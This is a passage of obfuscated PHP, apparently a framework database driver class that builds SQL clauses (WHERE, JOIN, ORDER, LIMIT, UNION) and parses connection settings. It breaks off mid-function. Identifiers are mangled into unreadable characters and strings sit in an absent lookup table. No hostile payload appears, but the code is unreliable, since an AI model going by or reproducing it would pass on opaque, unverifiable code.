"\x53\105\x4c\x45\x43\x54\x25\104\111\123\x54\111\x4e\x43\124\x25\40\45\106\111\x45\x4c\104\x25\40\106\122\x4f\x4d\40\45\124\x41\x42\114\x45\x25\x25\x4a\117\111\x4e\45\45\127\110\x45\122\x45\45\x25\107\x52\x4f\125\x50\x25\45\110\x41\126\111\116\107\45\45\x4f\x52\x44\x45\122\x25\45\114\111\x4d\111\124\45\x20\45\x55\x4e\111\x4f\116\45\x25\x43\117\x4d\115\105\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $Å–ó—ø = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¯µç›È¢][972], $Å–ó—ø); } public function factory($’€íİŸø = '') { $®Ä ààÂ =& $_SERVER[¯µç›È¢]; $’€íİŸø = $this->parseConfig($’€íİŸø); if (empty($’€íİŸø[$®Ä ààÂ[973]])) { think_exception(think_lang($®Ä ààÂ[974])); } $this->dbType = ucwords(strtolower($’€íİŸø[$®Ä ààÂ[973]])); $®ÎâÊòÈ = $®Ä ààÂ[975] . $this->dbType; if (class_exists($®ÎâÊòÈ)) { $×ëé¢öà = new $®ÎâÊòÈ($’€íİŸø); if ($®Ä ààÂ[976] != strtolower($’€íİŸø[$®Ä ààÂ[973]])) { $×ëé¢öà->dbType = strtoupper($this->dbType); } else { $×ëé¢öà->dbType = $this->_getDsnType($’€íİŸø[$®Ä ààÂ[928]]); } } else { think_exception(think_lang($®Ä ààÂ[977]) . $®Ä ààÂ[978] . $®ÎâÊòÈ); } return $×ëé¢öà; } public function __call($ò¡¶ªŒ½, $–ÇŞ ‹») { if (method_exists($this, $ò¡¶ªŒ½)) { return call_user_func_array(array($this, $ò¡¶ªŒ½), $–ÇŞ ‹»); } } protected function _getDsnType($µìâŠìÎ) { $ÑÖùŸ¬¥ = explode($_SERVER[¯µç›È¢][4], $µìâŠìÎ); $Àşõ„´Š = strtoupper(trim($ÑÖùŸ¬¥[0])); return $Àşõ„´Š; } private function parseConfig($¼¸µÜ¦Ö = '') { $ú—ª‰êº =& $_SERVER[¯µç›È¢]; if (!empty($¼¸µÜ¦Ö) && is_string($¼¸µÜ¦Ö)) { $¼¸µÜ¦Ö = $this->parseDSN($¼¸µÜ¦Ö); } elseif (is_array($¼¸µÜ¦Ö)) { $¼¸µÜ¦Ö = array_change_key_case($¼¸µÜ¦Ö); $¼¸µÜ¦Ö = array($ú—ª‰êº[973] => $¼¸µÜ¦Ö[$ú—ª‰êº[979]], $ú—ª‰êº[900] => $¼¸µÜ¦Ö[$ú—ª‰êº[980]], $ú—ª‰êº[901] => $¼¸µÜ¦Ö[$ú—ª‰êº[981]], $ú—ª‰êº[898] => $¼¸µÜ¦Ö[$ú—ª‰êº[982]], $ú—ª‰êº[899] => $¼¸µÜ¦Ö[$ú—ª‰êº[983]], $ú—ª‰êº[21] => $¼¸µÜ¦Ö[$ú—ª‰êº[984]], $ú—ª‰êº[928] => $¼¸µÜ¦Ö[$ú—ª‰êº[985]], $ú—ª‰êº[17] => isset($¼¸µÜ¦Ö[$ú—ª‰êº[986]]) ? $¼¸µÜ¦Ö[$ú—ª‰êº[986]] : array()); } elseif (empty($¼¸µÜ¦Ö)) { if (think_config($ú—ª‰êº[987]) && $ú—ª‰êº[976] != strtolower(think_config($ú—ª‰êº[988]))) { $¼¸µÜ¦Ö = $this->parseDSN(think_config($ú—ª‰êº[987])); } else { $¼¸µÜ¦Ö = array($ú—ª‰êº[973] => think_config($ú—ª‰êº[988]), $ú—ª‰êº[900] => think_config($ú—ª‰êº[989]), $ú—ª‰êº[901] => think_config($ú—ª‰êº[990]), $ú—ª‰êº[898] => think_config($ú—ª‰êº[991]), $ú—ª‰êº[899] => think_config($ú—ª‰êº[992]), $ú—ª‰êº[21] => think_config($ú—ª‰êº[254]), $ú—ª‰êº[928] => think_config($ú—ª‰êº[987]), $ú—ª‰êº[17] => think_config($ú—ª‰êº[993])); } } return $¼¸µÜ¦Ö; } protected function initConnect($¼³‘Æ†¨ = true) { if (1 == think_config($_SERVER[¯µç›È¢][22])) { $this->_linkID = $this->multiConnect($¼³‘Æ†¨); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $«÷ˆÌ‰á => $èëç»Ş¤) { $this->_linkID = $èëç»Ş¤; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($±Å´Òµ = false) { $øÛ ûÜ =& $_SERVER[¯µç›È¢]; static $‘µØöõ = array(); static $ÒÊıˆ‡Ê = -1; if (empty($‘µØöõ)) { foreach ($this->config as $‹‹Æ÷”¨ => $ş‰¡…¬) { $‘µØöõ[$‹‹Æ÷”¨] = explode($øÛ ûÜ[50], $ş‰¡…¬); } } if (think_config($øÛ ûÜ[994])) { if ($±Å´Òµ || think_config($øÛ ûÜ[401]) === !0) { $¥¼¯€–¿ = floor(mt_rand(0, think_config($øÛ ûÜ[995]) - 1)); $ÒÊıˆ‡Ê = $¥¼¯€–¿; } else { if (is_numeric(think_config($øÛ ûÜ[996]))) { $¥¼¯€–¿ = think_config($øÛ ûÜ[996]); } else { $¥¼¯€–¿ = floor(mt_rand(think_config($øÛ ûÜ[995]), count($‘µØöõ[$øÛ ûÜ[898]]) - 1)); } } } else { $¥¼¯€–¿ = floor(mt_rand(0, count($‘µØöõ[$øÛ ûÜ[898]]) - 1)); $ÒÊıˆ‡Ê = $¥¼¯€–¿; } $¥¼¯€–¿ = $ÒÊıˆ‡Ê !== -1 ? $ÒÊıˆ‡Ê : $¥¼¯€–¿; $Ç¶ªÖ¡À = array($øÛ ûÜ[900] => isset($‘µØöõ[$øÛ ûÜ[900]][$¥¼¯€–¿]) ? $‘µØöõ[$øÛ ûÜ[900]][$¥¼¯€–¿] : $‘µØöõ[$øÛ ûÜ[900]][0], $øÛ ûÜ[901] => isset($‘µØöõ[$øÛ ûÜ[901]][$¥¼¯€–¿]) ? $‘µØöõ[$øÛ ûÜ[901]][$¥¼¯€–¿] : $‘µØöõ[$øÛ ûÜ[901]][0], $øÛ ûÜ[898] => isset($‘µØöõ[$øÛ ûÜ[898]][$¥¼¯€–¿]) ? $‘µØöõ[$øÛ ûÜ[898]][$¥¼¯€–¿] : $‘µØöõ[$øÛ ûÜ[898]][0], $øÛ ûÜ[899] => isset($‘µØöõ[$øÛ ûÜ[899]][$¥¼¯€–¿]) ? $‘µØöõ[$øÛ ûÜ[899]][$¥¼¯€–¿] : $‘µØöõ[$øÛ ûÜ[899]][0], $øÛ ûÜ[21] => isset($‘µØöõ[$øÛ ûÜ[21]][$¥¼¯€–¿]) ? $‘µØöõ[$øÛ ûÜ[21]][$¥¼¯€–¿] : $‘µØöõ[$øÛ ûÜ[21]][0], $øÛ ûÜ[928] => isset($‘µØöõ[$øÛ ûÜ[928]][$¥¼¯€–¿]) ? $‘µØöõ[$øÛ ûÜ[928]][$¥¼¯€–¿] : $‘µØöõ[$øÛ ûÜ[928]][0], $øÛ ûÜ[17] => isset($‘µØöõ[$øÛ ûÜ[17]][$¥¼¯€–¿]) ? $‘µØöõ[$øÛ ûÜ[17]][$¥¼¯€–¿] : $‘µØöõ[$øÛ ûÜ[17]][0]); return $this->connect($Ç¶ªÖ¡À, $¥¼¯€–¿); } public function parseDSN($æ¿Ç½¸”) { $Üœ¯Ùß˜ =& $_SERVER[¯µç›È¢]; if (empty($æ¿Ç½¸”)) { return !1; } $¨¾©ÚòŸ = parse_url($æ¿Ç½¸”); if ($¨¾©ÚòŸ[$Üœ¯Ùß˜[187]]) { $öà’—°ª = array($Üœ¯Ùß˜[973] => $¨¾©ÚòŸ[$Üœ¯Ùß˜[187]], $Üœ¯Ùß˜[900] => isset($¨¾©ÚòŸ[$Üœ¯Ùß˜[602]]) ? $¨¾©ÚòŸ[$Üœ¯Ùß˜[602]] : $Üœ¯Ùß˜[12], $Üœ¯Ùß˜[901] => isset($¨¾©ÚòŸ[$Üœ¯Ùß˜[997]]) ? $¨¾©ÚòŸ[$Üœ¯Ùß˜[997]] : $Üœ¯Ùß˜[12], $Üœ¯Ùß˜[898] => isset($¨¾©ÚòŸ[$Üœ¯Ùß˜[188]]) ? $¨¾©ÚòŸ[$Üœ¯Ùß˜[188]] : $Üœ¯Ùß˜[12], $Üœ¯Ùß˜[899] => isset($¨¾©ÚòŸ[$Üœ¯Ùß˜[189]]) ? $¨¾©ÚòŸ[$Üœ¯Ùß˜[189]] : $Üœ¯Ùß˜[12], $Üœ¯Ùß˜[21] => isset($¨¾©ÚòŸ[$Üœ¯Ùß˜[88]]) ? substr($¨¾©ÚòŸ[$Üœ¯Ùß˜[88]], 1) : $Üœ¯Ùß˜[12]); } else { preg_match($Üœ¯Ùß˜[998], trim($æ¿Ç½¸”), $ÜÙ¡äûÛ); $öà’—°ª = array($Üœ¯Ùß˜[973] => $ÜÙ¡äûÛ[1], $Üœ¯Ùß˜[900] => $ÜÙ¡äûÛ[2], $Üœ¯Ùß˜[901] => $ÜÙ¡äûÛ[3], $Üœ¯Ùß˜[898] => $ÜÙ¡äûÛ[4], $Üœ¯Ùß˜[899] => $ÜÙ¡äûÛ[5], $Üœ¯Ùß˜[21] => $ÜÙ¡äûÛ[6]); } $öà’—°ª[$Üœ¯Ùß˜[928]] = $Üœ¯Ùß˜[12]; return $öà’—°ª; } protected function debug() { $ÜÙĞÂĞ¨ =& $_SERVER[¯µç›È¢]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ÜÙĞÂĞ¨[999]; if (think_config($ÜÙĞÂĞ¨[1000])) { think_status($ÜÙĞÂĞ¨[1001]); think_trace($this->queryStr . $ÜÙĞÂĞ¨[1002] . think_status($ÜÙĞÂĞ¨[24], $ÜÙĞÂĞ¨[1001], 6) . $ÜÙĞÂĞ¨[1003], $ÜÙĞÂĞ¨[12], $ÜÙĞÂĞ¨[1004]); } } protected function parseLock($‚¥İ£Ìæ = false) { $ğ°İĞ ì =& $_SERVER[¯µç›È¢]; if (!$‚¥İ£Ìæ) { return $ğ°İĞ ì[12]; } if ($ğ°İĞ ì[930] == $this->dbType) { return $ğ°İĞ ì[1005]; } return $ğ°İĞ ì[1006]; } protected function parseSet($™“øÚà´) { $Œ´“ª =& $_SERVER[¯µç›È¢]; foreach ($™“øÚà´ as $å¥¹¾§¬ => $è¼À®Øµ) { if (is_array($è¼À®Øµ) && $Œ´“ª[305] == $è¼À®Øµ[0]) { $­“»Ïú¬[] = $this->parseKey($å¥¹¾§¬) . $Œ´“ª[896] . $è¼À®Øµ[1]; } elseif (is_scalar($è¼À®Øµ) || is_null($è¼À®Øµ)) { $­“»Ïú¬[] = $this->parseKey($å¥¹¾§¬) . $Œ´“ª[896] . $this->parseValue($è¼À®Øµ); } } return $Œ´“ª[1007] . implode($Œ´“ª[50], $­“»Ïú¬); } protected function bindParam($¯û›ÂäÃ, $è‚­±¥˜) { $this->bind[$_SERVER[¯µç›È¢][4] . $¯û›ÂäÃ] = $è‚­±¥˜; } protected function parseBind($ÀÛª¯™) { $ÀÛª¯™ = array_merge($this->bind, $ÀÛª¯™); $this->bind = array(); return $ÀÛª¯™; } function parseKey(&$½©¾ÚÊ, $î‡æÎÂ¨ = true) { if ($î‡æÎÂ¨) { $½©¾ÚÊ = $this->parseKeyCheck($½©¾ÚÊ); } return $½©¾ÚÊ; } function parseKeyCheck($É§åÌòé) { $”¥Ëıö© =& $_SERVER[¯µç›È¢]; $É§åÌòé = trim($É§åÌòé); if (!preg_match($”¥Ëıö©[1008], $É§åÌòé)) { think_exception($”¥Ëıö©[1009] . $É§åÌòé); } return $É§åÌòé; } protected function parseValue($¡‡Ï­³·) { $²”±²Í÷ =& $_SERVER[¯µç›È¢]; if (is_string($¡‡Ï­³·)) { $¡‡Ï­³· = $²”±²Í÷[969] . $this->escapeString($¡‡Ï­³·) . $²”±²Í÷[969]; } elseif (isset($¡‡Ï­³·[0]) && is_string($¡‡Ï­³·[0]) && strtolower($¡‡Ï­³·[0]) == $²”±²Í÷[305]) { $¡‡Ï­³· = $this->escapeString($¡‡Ï­³·[1]); } elseif (is_array($¡‡Ï­³·)) { $¡‡Ï­³· = array_map(array($this, $²”±²Í÷[970]), $¡‡Ï­³·); } elseif (is_bool($¡‡Ï­³·)) { $¡‡Ï­³· = $¡‡Ï­³· ? $²”±²Í÷[99] : $²”±²Í÷[204]; } elseif (is_null($¡‡Ï­³·)) { $¡‡Ï­³· = $²”±²Í÷[114]; } return $¡‡Ï­³·; } protected function parseField($ö‡¨ïª) { $˜¤¢³ë« =& $_SERVER[¯µç›È¢]; if (is_string($ö‡¨ïª) && strpos($ö‡¨ïª, $˜¤¢³ë«[50])) { $ö‡¨ïª = explode($˜¤¢³ë«[50], $ö‡¨ïª); } if (is_array($ö‡¨ïª)) { $ˆ½Ì¶±¢ = array(); foreach ($ö‡¨ïª as $Œ‚¤Î†Ÿ => $Ğ·Ú‡ªâ) { if (!is_numeric($Œ‚¤Î†Ÿ)) { $ˆ½Ì¶±¢[] = $this->parseKey($Œ‚¤Î†Ÿ, !1) . $˜¤¢³ë«[1010] . $this->parseKey($Ğ·Ú‡ªâ); } else { $ˆ½Ì¶±¢[] = $this->parseKey($Ğ·Ú‡ªâ); } } $Ã°å¢İ = implode($˜¤¢³ë«[50], $ˆ½Ì¶±¢); } elseif (is_string($ö‡¨ïª) && !empty($ö‡¨ïª)) { $Ã°å¢İ = $ö‡¨ïª; } else { $Ã°å¢İ = $˜¤¢³ë«[195]; } return $Ã°å¢İ; } protected function parseTable($”ÙôË—ß) { $Ñ˜’ŠÙó =& $_SERVER[¯µç›È¢]; if (is_array($”ÙôË—ß)) { $öºº Ôª = array(); foreach ($”ÙôË—ß as $š†ÆµÌ• => $ÆÕê®™£) { if (!is_numeric($š†ÆµÌ•)) { $öºº Ôª[] = $this->parseKey($š†ÆµÌ•) . $Ñ˜’ŠÙó[53] . $this->parseKey($ÆÕê®™£); } else { $öºº Ôª[] = $this->parseKey($š†ÆµÌ•); } } $”ÙôË—ß = $öºº Ôª; } elseif (is_string($”ÙôË—ß)) { if (strstr($”ÙôË—ß, $Ñ˜’ŠÙó[53])) { return $”ÙôË—ß; } $”ÙôË—ß = explode($Ñ˜’ŠÙó[50], $”ÙôË—ß); array_walk($”ÙôË—ß, array($this, $Ñ˜’ŠÙó[918])); } return $Ñ˜’ŠÙó[912] . trim(implode($Ñ˜’ŠÙó[1011], $”ÙôË—ß), $Ñ˜’ŠÙó[393]) . $Ñ˜’ŠÙó[912]; } protected function parseWhere($ĞŞ±ĞÊÜ) { $½¥Ä„‰Î =& $_SERVER[¯µç›È¢]; $åÇÅØç = $½¥Ä„‰Î[12]; if (is_string($ĞŞ±ĞÊÜ)) { $åÇÅØç = $ĞŞ±ĞÊÜ; } else { $´ÖÆ¢ƒ = isset($ĞŞ±ĞÊÜ[$½¥Ä„‰Î[1012]]) ? strtoupper($ĞŞ±ĞÊÜ[$½¥Ä„‰Î[1012]]) : $½¥Ä„‰Î[12]; if (in_array($´ÖÆ¢ƒ, array($½¥Ä„‰Î[1013], $½¥Ä„‰Î[1014], $½¥Ä„‰Î[1015]))) { $´ÖÆ¢ƒ = $½¥Ä„‰Î[53] . $´ÖÆ¢ƒ . $½¥Ä„‰Î[53]; unset($ĞŞ±ĞÊÜ[$½¥Ä„‰Î[1012]]); } else { $´ÖÆ¢ƒ = $½¥Ä„‰Î[1016]; } foreach ($ĞŞ±ĞÊÜ as $íÖ¤ÅêŸ => $ÄéÛÅ») { $åÇÅØç .= $½¥Ä„‰Î[285]; if (is_numeric($íÖ¤ÅêŸ)) { $íÖ¤ÅêŸ = $½¥Ä„‰Î[1017]; } if (0 === strpos($íÖ¤ÅêŸ, $½¥Ä„‰Î[11])) { $åÇÅØç .= $this->parseThinkWhere($íÖ¤ÅêŸ, $ÄéÛÅ»); } else { if (!preg_match($½¥Ä„‰Î[1018], trim($íÖ¤ÅêŸ))) { think_exception(think_lang($½¥Ä„‰Î[1019]) . $½¥Ä„‰Î[4] . $íÖ¤ÅêŸ); } $Ö¶Úò¨‚ = is_array($ÄéÛÅ») && isset($ÄéÛÅ»[$½¥Ä„‰Î[1020]]); $íÖ¤ÅêŸ = trim($íÖ¤ÅêŸ); if (strpos($íÖ¤ÅêŸ, $½¥Ä„‰Î[291])) { $­´ĞèÀ¡ = explode($½¥Ä„‰Î[291], $íÖ¤ÅêŸ); $¯ÕÓ±‰· = array(); foreach ($­´ĞèÀ¡ as $ğ˜‡€› => $À‡¿íÆô) { $„–Ñ©åø = $Ö¶Úò¨‚ ? $ÄéÛÅ»[$ğ˜‡€›] : $ÄéÛÅ»; $¯ÕÓ±‰·[] = $½¥Ä„‰Î[268] . $this->parseWhereItem($this->parseKey($À‡¿íÆô), $„–Ñ©åø) . $½¥Ä„‰Î[917]; } $åÇÅØç .= implode($½¥Ä„‰Î[1021], $¯ÕÓ±‰·); } elseif (strpos($íÖ¤ÅêŸ, $½¥Ä„‰Î[292])) { $­´ĞèÀ¡ = explode($½¥Ä„‰Î[292], $íÖ¤ÅêŸ); $¯ÕÓ±‰· = array(); foreach ($­´ĞèÀ¡ as $ğ˜‡€› => $À‡¿íÆô) { $„–Ñ©åø = $Ö¶Úò¨‚ ? $ÄéÛÅ»[$ğ˜‡€›] : $ÄéÛÅ»; $¯ÕÓ±‰·[] = $½¥Ä„‰Î[268] . $this->parseWhereItem($this->parseKey($À‡¿íÆô), $„–Ñ©åø) . $½¥Ä„‰Î[917]; } $åÇÅØç .= implode($½¥Ä„‰Î[1016], $¯ÕÓ±‰·); } else { $åÇÅØç .= $this->parseWhereItem($this->parseKey($íÖ¤ÅêŸ), $ÄéÛÅ»); } } $åÇÅØç .= $½¥Ä„‰Î[286] . $´ÖÆ¢ƒ; } $åÇÅØç = substr($åÇÅØç, 0, -strlen($´ÖÆ¢ƒ)); } return empty($åÇÅØç) ? $½¥Ä„‰Î[12] : $½¥Ä„‰Î[1022] . $åÇÅØç; } protected function parseWhereItem($ ’Õ¤ñÏ, $Ö™¸î±) { $†¼ø‰öç =& $_SERVER[¯µç›È¢]; $Ö”ÅÔšĞ = $†¼ø‰öç[12]; if (is_array($Ö™¸î±)) { if (is_string($Ö™¸î±[0])) { $‚›Ğ®Ë = strtolower($Ö™¸î±[0]); if (in_array($Ö™¸î±[0], array($†¼ø‰öç[896], $†¼ø‰öç[1023], $†¼ø‰öç[1024], $†¼ø‰öç[1025], $†¼ø‰öç[1026], $†¼ø‰öç[1027]))) { $Ö”ÅÔšĞ .= $ ’Õ¤ñÏ . $†¼ø‰öç[53] . $Ö™¸î±[0] . $†¼ø‰öç[53] . $this->parseValue($Ö™¸î±[1]); } elseif (preg_match($†¼ø‰öç[1028], $Ö™¸î±[0])) { $Ö”ÅÔšĞ .= $ ’Õ¤ñÏ . $†¼ø‰öç[53] . $this->exp[$‚›Ğ®Ë] . $†¼ø‰öç[53] . $this->parseValue($Ö™¸î±[1]); } elseif (preg_match($†¼ø‰öç[1029], $Ö™¸î±[0])) { if (is_array($Ö™¸î±[1])) { $Ãúé¹¢ = isset($Ö™¸î±[2]) ? strtoupper($Ö™¸î±[2]) : $†¼ø‰öç[1014]; if (in_array($Ãúé¹¢, array($†¼ø‰öç[1013], $†¼ø‰öç[1014], $†¼ø‰öç[1015]))) { $èåà“İá = array(); foreach ($Ö™¸î±[1] as $†œ„û¿) { $èåà“İá[] = $ ’Õ¤ñÏ . $†¼ø‰öç[53] . $this->exp[$‚›Ğ®Ë] . $†¼ø‰öç[53] . $this->parseValue($†œ„û¿); } $Ö”ÅÔšĞ .= $†¼ø‰öç[268] . implode($†¼ø‰öç[53] . $Ãúé¹¢ . $†¼ø‰öç[53], $èåà“İá) . $†¼ø‰öç[917]; } } else { $Ö”ÅÔšĞ .= $ ’Õ¤ñÏ . $†¼ø‰öç[53] . $this->exp[$‚›Ğ®Ë] . $†¼ø‰öç[53] . $this->parseValue($Ö™¸î±[1]); } } elseif ($†¼ø‰öç[305] == $‚›Ğ®Ë) { $Ö”ÅÔšĞ .= $†¼ø‰öç[915] . $ ’Õ¤ñÏ . $†¼ø‰öç[53] . $Ö™¸î±[1] . $†¼ø‰öç[1030]; } elseif (preg_match($†¼ø‰öç[1031], $Ö™¸î±[0])) { $Ö”ÅÔšĞ .= $Ö™¸î±[0]; } elseif (preg_match($†¼ø‰öç[1032], $Ö™¸î±[0])) { if (isset($Ö™¸î±[2]) && $†¼ø‰öç[305] == $Ö™¸î±[2]) { $Ö”ÅÔšĞ .= $ ’Õ¤ñÏ . $†¼ø‰öç[53] . $this->exp[$‚›Ğ®Ë] . $†¼ø‰öç[53] . $Ö™¸î±[1]; } else { if (is_string($Ö™¸î±[1])) { $Ö™¸î±[1] = explode($†¼ø‰öç[50], $Ö™¸î±[1]); } $Æøı¸†á = implode($†¼ø‰öç[50], $this->parseValue($Ö™¸î±[1])); $Ö”ÅÔšĞ .= $ ’Õ¤ñÏ . $†¼ø‰öç[53] . $this->exp[$‚›Ğ®Ë] . $†¼ø‰öç[915] . $Æøı¸†á . $†¼ø‰öç[917]; } } elseif (preg_match($†¼ø‰öç[1033], $Ö™¸î±[0])) { $Ü¾¼Ã­ = is_string($Ö™¸î±[1]) ? explode($†¼ø‰öç[50], $Ö™¸î±[1]) : $Ö™¸î±[1]; $Ö”ÅÔšĞ .= $†¼ø‰öç[915] . $ ’Õ¤ñÏ . $†¼ø‰öç[53] . $this->exp[$‚›Ğ®Ë] . $†¼ø‰öç[53] . $this->parseValue($Ü¾¼Ã­[0]) . $†¼ø‰öç[1016] . $this->parseValue($Ü¾¼Ã­[1]) . $†¼ø‰öç[286]; } else { think_exception(think_lang($†¼ø‰öç[1019]) . $†¼ø‰öç[4] . $Ö™¸î±[0]); } } else { $î±¸Ò—û = count($Ö™¸î±); $¢ğ»ı¨ = $†¼ø‰öç[12]; if (is_string($Ö™¸î±[$î±¸Ò—û - 1])) { $¢ğ»ı¨ = isset($Ö™¸î±[$î±¸Ò—û - 1]) ? strtoupper($Ö™¸î±[$î±¸Ò—û - 1]) : $†¼ø‰öç[12]; if (in_array($¢ğ»ı¨, array($†¼ø‰öç[1013], $†¼ø‰öç[1014], $†¼ø‰öç[1015]))) { $î±¸Ò—û = $î±¸Ò—û - 1; } } else { $¢ğ»ı¨ = $†¼ø‰öç[1013]; } for ($ºÌàşºÃ = 0; $ºÌàşºÃ < $î±¸Ò—û; $ºÌàşºÃ++) { $Ü¾¼Ã­ = is_array($Ö™¸î±[$ºÌàşºÃ]) ? $Ö™¸î±[$ºÌàşºÃ][1] : $Ö™¸î±[$ºÌàşºÃ]; if ($†¼ø‰öç[305] == strtolower($Ö™¸î±[$ºÌàşºÃ][0])) { $Ö”ÅÔšĞ .= $†¼ø‰öç[268] . $ ’Õ¤ñÏ . $†¼ø‰öç[53] . $Ü¾¼Ã­ . $†¼ø‰öç[1030] . $¢ğ»ı¨ . $†¼ø‰öç[53]; } else { $åêúØØÔ = is_array($Ö™¸î±[$ºÌàşºÃ]) ? $this->exp[strtolower($Ö™¸î±[$ºÌàşºÃ][0])] : $†¼ø‰öç[896]; if (!$åêúØØÔ && is_array($Ö™¸î±[$ºÌàşºÃ]) && in_array($Ö™¸î±[$ºÌàşºÃ][0], array($†¼ø‰öç[896], $†¼ø‰öç[1023], $†¼ø‰öç[1024], $†¼ø‰öç[1025], $†¼ø‰öç[1026], $†¼ø‰öç[1027]))) { $åêúØØÔ = $Ö™¸î±[$ºÌàşºÃ][0]; } $Ö”ÅÔšĞ .= $†¼ø‰öç[268] . $ ’Õ¤ñÏ . $†¼ø‰öç[53] . $åêúØØÔ . $†¼ø‰öç[53] . $this->parseValue($Ü¾¼Ã­) . $†¼ø‰öç[1030] . $¢ğ»ı¨ . $†¼ø‰öç[53]; } } $Ö”ÅÔšĞ = substr($Ö”ÅÔšĞ, 0, -4); } } else { $Ö”ÅÔšĞ .= $ ’Õ¤ñÏ . $†¼ø‰öç[1034] . $this->parseValue($Ö™¸î±); } return $Ö”ÅÔšĞ; } protected function parseThinkWhere($Øè„çâ², $¶¯®ÕÆÀ) { $¾Œôèì =& $_SERVER[¯µç›È¢]; $¾ŒØîÉ× = $¾Œôèì[12]; switch ($Øè„çâ²) { case $¾Œôèì[360]: $¾ŒØîÉ× = $¶¯®ÕÆÀ; break; case $¾Œôèì[1017]: $¾ŒØîÉ× = is_string($¶¯®ÕÆÀ) ? $¶¯®ÕÆÀ : substr($this->parseWhere($¶¯®ÕÆÀ), 6); break; case $¾Œôèì[1035]: parse_str($¶¯®ÕÆÀ, $…ÒÆ²Ë¸); if (isset($…ÒÆ²Ë¸[$¾Œôèì[1012]])) { $¹¨¯æêñ = $¾Œôèì[53] . strtoupper($…ÒÆ²Ë¸[$¾Œôèì[1012]]) . $¾Œôèì[53]; unset($…ÒÆ²Ë¸[$¾Œôèì[1012]]); } else { $¹¨¯æêñ = $¾Œôèì[1016]; } $ò·µ©ñÜ = array(); foreach ($…ÒÆ²Ë¸ as $Û§÷‡’Â => $åÒ –„÷) { $ò·µ©ñÜ[] = $this->parseKey($Û§÷‡’Â) . $¾Œôèì[1034] . $this->parseValue($åÒ –„÷); } $¾ŒØîÉ× = implode($¹¨¯æêñ, $ò·µ©ñÜ); break; } return $¾ŒØîÉ×; } protected function parseLimit($áâ÷ƒûÊ) { $¼¼Ÿª  =& $_SERVER[¯µç›È¢]; return !empty($áâ÷ƒûÊ) ? $¼¼Ÿª [51] . $áâ÷ƒûÊ . $¼¼Ÿª [53] : $¼¼Ÿª [12]; } protected function parseJoin($˜ïèÈÏ×) { $­û€çÔş =& $_SERVER[¯µç›È¢]; $çŠ¯¸İ = $­û€çÔş[12]; if (!empty($˜ïèÈÏ×)) { if (is_array($˜ïèÈÏ×)) { foreach ($˜ïèÈÏ× as $ıµ«‰² => $µ§Õæé) { if (!1 !== stripos($µ§Õæé, $­û€çÔş[1036])) { $çŠ¯¸İ .= $­û€çÔş[53] . $µ§Õæé; } else { $çŠ¯¸İ .= $­û€çÔş[1037] . $µ§Õæé; } } } else { $çŠ¯¸İ .= $­û€çÔş[1037] . $˜ïèÈÏ×; } } $çŠ¯¸İ = preg_replace($­û€çÔş[1038], think_config($­û€çÔş[942]) . $­û€çÔş[1039], $çŠ¯¸İ); return $çŠ¯¸İ; } protected function parseOrder($ñ†—¤) { $ò¢¬Æìİ =& $_SERVER[¯µç›È¢]; if (is_array($ñ†—¤)) { $Ş¶Õ‹¬¸ = array(); foreach ($ñ†—¤ as $¸ş”‚Ëƒ => $½¬ĞÎ¯é) { if (is_numeric($¸ş”‚Ëƒ)) { $Ş¶Õ‹¬¸[] = $this->parseKey($½¬ĞÎ¯é); } else { $½¬ĞÎ¯é = in_array(strtoupper(trim($½¬ĞÎ¯é)), array($ò¢¬Æìİ[1040], $ò¢¬Æìİ[1041])) ? $ò¢¬Æìİ[53] . $½¬ĞÎ¯é : $ò¢¬Æìİ[12]; if (preg_match($ò¢¬Æìİ[1042], $¸ş”‚Ëƒ)) { $Ş¶Õ‹¬¸[] = $this->parseKey($¸ş”‚Ëƒ) . $½¬ĞÎ¯é; } else { think_exception($ò¢¬Æìİ[1043] . $¸ş”‚Ëƒ); } } } $ñ†—¤ = implode($ò¢¬Æìİ[50], $Ş¶Õ‹¬¸); } return !empty($ñ†—¤) ? $ò¢¬Æìİ[1044] . $ñ†—¤ : $ò¢¬Æìİ[12]; } protected function parseGroup($ƒ¢ó½àÛ) { $Ê”Õîì =& $_SERVER[¯µç›È¢]; return !empty($ƒ¢ó½àÛ) ? $Ê”Õîì[1045] . $ƒ¢ó½àÛ : $Ê”Õîì[12]; } protected function parseHaving($ù‹¸Õ’õ) { $­éÑĞÀ =& $_SERVER[¯µç›È¢]; return !empty($ù‹¸Õ’õ) ? $­éÑĞÀ[1046] . $ù‹¸Õ’õ : $­éÑĞÀ[12]; } protected function parseComment($Œ¡Ó¯ç­) { $œıòÃ–÷ =& $_SERVER[¯µç›È¢]; return !empty($Œ¡Ó¯ç­) ? $œıòÃ–÷[1047] . $Œ¡Ó¯ç­ . $œıòÃ–÷[1048] : $œıòÃ–÷[12]; } protected function parseDistinct($˜¹î—¾ë) { $¨»ì¬£× =& $_SERVER[¯µç›È¢]; return !empty($˜¹î—¾ë) ? $¨»ì¬£×[1049] : $¨»ì¬£×[12]; } protected function parseUnion($ÚÔ®éÜÖ) { $èßñ×áŠ =& $_SERVER[¯µç›È¢]; if (empty($ÚÔ®éÜÖ)) { return $èßñ×áŠ[12]; } if (isset($ÚÔ®éÜÖ[$èßñ×áŠ[356]])) { $Á¯“‰¯æ = $èßñ×áŠ[1050]; unset($ÚÔ®éÜÖ[$èßñ×áŠ[356]]); } else { $Á¯“‰¯æ = $èßñ×áŠ[1051]; } foreach ($ÚÔ®éÜÖ as $Æçñä¿–) { $áµ¼™ó[] = $Á¯“‰¯æ . (is_array($Æçñä¿–) ? $this->buildSelectSql($Æçñä¿–) : $Æçñä¿–); } return implode($èßñ×áŠ[53], $áµ¼™ó); } public function insert($›ï†ß«İ, $¥üèòåÆ = array(), $èìÀ™ò = false) { $¶¨ğ™Î— =& $_SERVER[¯µç›È¢]; $¼®÷¢¹Ê = $û‘’œŒ = array(); $this->model = $¥üèòåÆ[$¶¨ğ™Î—[289]]; foreach ($›ï†ß«İ as $ú¡—û˜„ => $£€Äşâà) { if (is_array($£€Äşâà) && $¶¨ğ™Î—[305] == $£€Äşâà[0]) { $û‘’œŒ[] = $this->parseKey($ú¡—û˜„); $¼®÷¢¹Ê[] = $£€Äşâà[1]; } elseif (is_scalar($£€Äşâà) || is_null($£€Äşâà)) { 